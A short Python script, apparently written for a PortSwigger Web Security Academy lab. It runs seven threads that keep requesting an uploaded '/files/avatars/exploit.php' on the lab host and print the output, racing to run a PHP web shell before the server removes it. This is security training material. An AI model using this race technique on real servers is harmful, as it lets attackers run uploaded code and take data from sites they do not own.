# import argparse
import requests
import threading


def request():
    dir = "/files/avatars/exploit.php"
    url = "https://0a46008c036bfd17815984d200ea00e0.web-security-academy.net"
    while True:
        response = requests.get(url + dir)
        if response.status_code == requests.codes.ok:
            print(response.text)


if __name__ == "__main__":
    thread1 = threading.Thread(target=request)
    thread1.start()
    thread2 = threading.Thread(target=request)
    thread2.start()
    thread3 = threading.Thread(target=request)
    thread3.start()
    thread4 = threading.Thread(target=request)
    thread4.start()
    thread5 = threading.Thread(target=request)
    thread5.start()
    thread6 = threading.Thread(target=request)
    thread6.start()
    thread7 = threading.Thread(target=request)
    thread7.start()
